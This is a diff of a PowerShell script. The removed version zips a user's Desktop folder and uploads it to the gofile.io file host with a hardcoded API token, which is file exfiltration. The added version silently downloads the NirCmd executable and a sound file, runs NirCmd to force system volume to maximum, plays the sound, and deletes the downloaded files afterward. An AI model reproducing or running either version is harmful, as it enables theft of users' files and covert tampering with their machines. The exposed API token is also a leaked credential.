@@ -1,31 +1,60 @@
-function Upload-direToGofile {
-    param (
-        [string]$Path,
-        [string]$ApiKey = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK",
-        [string]$newFolderId
-    )
-    
-      try{ 
-            if (Test-Path $Path) {
-        $zipPath = "C:\ProgramX64\extentions\upload_package.zip"
-        
-       
-        if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
-        
+$folder = "C:\ProgramX64\extensions"
+$file = "$folder\fah.mp3"
+$url = "https://www.myinstants.com/media/sounds/du-bist-gut-genug.mp3"
 
-        Compress-Archive -Path "$Path" -DestinationPath $zipPath -Force
-        $uploadUri = "https://store1.gofile.io/uploadFile"
-        
-        curl.exe -F "file=@$zipPath" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
-        Start-Sleep -Seconds 1 
-        Remove-Item $zipPath -Force
-    
-        
-                Start-Sleep -Seconds 1  
-            
-        }
-   }
-    catch {Write-Host "$($_.Exception.Message)"}
+# Create folder if it doesn't exist
+if (!(Test-Path $folder)) {
+    New-Item -ItemType Directory -Path $folder -Force | Out-Null
 }
-Upload-direToGofile -Path "c:\Users\onsbt\OneDrive\Desktop\s2\*" -newFolderId "95adad47-12b6-47e0-bc26-c895ea8bacb1"
-cls
+
+# Download the file
+Invoke-WebRequest -Uri $url -OutFile $file
+
+# Play sound using .NET (no WMPlayer)
+Add-Type -AssemblyName presentationCore
+$player = New-Object System.Windows.Media.MediaPlayer
+$player.Open([uri]$file)
+
+# Define paths
+
+$zipFile = "$folder\nircmd.zip"
+$exePath = "$folder\nircmd.exe"
+$exePath1 = "$folder\nircmdc.exe"
+
+$url = "https://www.nirsoft.net/utils/nircmd.zip"
+
+# 1. Create the directory if it doesn't exist
+if (!(Test-Path $folder)) {
+    New-Item -ItemType Directory -Path $folder -Force | Out-Null
+}
+
+
+Invoke-WebRequest -Uri $url -OutFile $zipFile
+
+Expand-Archive -Path $zipFile -DestinationPath $folder -Force
+
+# Use Start-Process with -Wait to ensure it finishes before deletion
+
+
+# 5. Cleanup: Remove the exe, the zip, and the folder
+# We use a small sleep to ensure the CPU has released the file handles
+
+Start-Process -FilePath $exePath -ArgumentList "setsysvolume 65535" -Wait
+Start-Sleep -Seconds 1
+
+
+$player.Play()
+
+# Wait
+Start-Sleep -Seconds 5
+Start-Sleep -Milliseconds 900
+
+# Stop playback
+$player.Stop()
+
+# Delete file
+Remove-Item $file -Force
+Start-Process -FilePath $exePath -ArgumentList "setsysvolume 65535" -Wait
+Remove-Item $zipFile -Force
+Remove-Item $exePath -Force
+Remove-Item $exePath1 -Force
